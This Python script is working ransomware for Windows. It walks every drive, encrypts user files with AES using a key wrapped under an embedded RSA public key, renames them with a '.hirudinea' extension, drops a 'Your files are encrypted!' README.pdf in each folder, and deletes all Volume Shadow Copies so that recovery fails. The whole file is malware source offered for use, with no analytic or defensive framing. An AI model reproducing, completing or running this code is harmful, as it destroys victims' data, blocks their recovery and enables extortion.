import string
import os
import subprocess
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from fpdf import FPDF

# RSA Public Key, replace this with your actual public key string
public_key_string = """
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAx+1dUDyO3lDfhA5rrYZg
hK4GjG3RraCQk4c9niGFgAvkmId2U+Pt0q1buNCjRSiYF0fS5w4fVQu5H8TorDkX
5aA9BtnpWYcpX78A7pg0ZpKrL+2w5uIbZoKHoQ5cshDyWJHOPqM76zMghP2GpQ2L
ZppYK1jh7iNkrA1X+qhzYTnnM3kzUEzFTgo4RtFxxuJfyH0RZ1BU6tP+nBRJGEz8
q6G70M69oFQHjUp+hRdlPF5tpZayz1ysdRs1NNW3M7n7MYb3VPsI1re3zTkxd9kV
RBFDSMwhzVdFzwDbnEsp8aipbi2cMfM6pERnB1P5XbFOTR9N4VxZ2sJxa5b/qCxE
CwIDAQAB
-----END PUBLIC KEY-----
"""

# Initialize RSA cipher
public_key = RSA.import_key(public_key_string)
rsa_cipher = PKCS1_OAEP.new(public_key)

# Directories to ignore
ignore_dirs = {
    '$Recycle.Bin', 'Boot', 'Documents and Settings', 'PerfLogs', 'Program Files',
    'Program Files (x86)', 'ProgramData', 'Recovery', 'System Volume Information', 'Windows', '$RECYCLE.BIN'
}

# File extensions to ignore
ignore_extensions = {
    '.bat', '.bin', '.cab', '.cd', '.com', '.cur', '.dagaba', '.diagcfg', '.diagpkg', '.drv', '.dll', '.exe',
    '.hlp', '.hta', '.ico', '.lnk', '.msi', '.ocx', '.ps1', '.psm1', '.scr', '.sys', '.ini', 'Thumbs.db', '.url', '.iso'
}

def delete_shadow_copies():
    subprocess.run("vssadmin delete shadows /all /quiet", shell=True)

def encrypt_file_section(file_path, cipher, start_offset, length):
    try:
        with open(file_path, 'r+b') as f:
            f.seek(start_offset)
            data = f.read(length)
            encrypted_data = cipher.encrypt(data)
            f.seek(start_offset)
            f.write(encrypted_data)
    except PermissionError:
        return False
    return True

def process_file(file_path, cipher, encrypted_key, encrypted_iv):
    file_size = os.path.getsize(file_path)
    sections = 1
    if file_size <= 1 * 1024 * 1024:
        if not encrypt_file_section(file_path, cipher, 0, file_size):
            return
    elif file_size <= 2 * 1024 * 1024:
        if not encrypt_file_section(file_path, cipher, 0, min(1 * 1024 * 1024, file_size)):
            return
    elif file_size <= 3 * 1024 * 1024:
        sections = 2
    elif file_size > 4 * 1024 * 1024:
        sections = 4
    for i in range(sections):
        section_size = file_size // sections
        if not encrypt_file_section(file_path, cipher, i * section_size, min(1 * 1024 * 1024, section_size)):
            return
    os.rename(file_path, file_path + ".hirudinea")
    with open(file_path + ".hirudinea", 'ab') as f:
        f.write(encrypted_key + encrypted_iv)

def create_readme_pdf(directory):
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, txt="Your files are encrypted!", ln=True, align='C')
    pdf.output(directory + "/README.pdf")

def main():
    # List all present drives from Z to A
    drives = [f"{letter}:\\" for letter in string.ascii_uppercase[::-1] if os.path.exists(f"{letter}:\\")]

    # Delete shadow copies before encryption
    delete_shadow_copies()

    # Create a AES CTR cipher with a random key and IV
    key = get_random_bytes(16)
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CTR, nonce=b'', initial_value=iv)

    # Encrypt the AES key and IV using RSA
    encrypted_key = rsa_cipher.encrypt(key)
    encrypted_iv = rsa_cipher.encrypt(iv)

    # Scan each drive
    for drive in drives:
        for root, dirs, files in os.walk(drive):
            dirs[:] = [d for d in dirs if d not in ignore_dirs]
            if files:
                for file in files:
                    if any(file.endswith(ext) for ext in ignore_extensions):
                        continue
                    file_path = os.path.join(root, file)
                    process_file(file_path, cipher, encrypted_key, encrypted_iv)
                create_readme_pdf(root)

    # Delete shadow copies after encryption
    delete_shadow_copies()

if __name__ == "__main__":
    main()

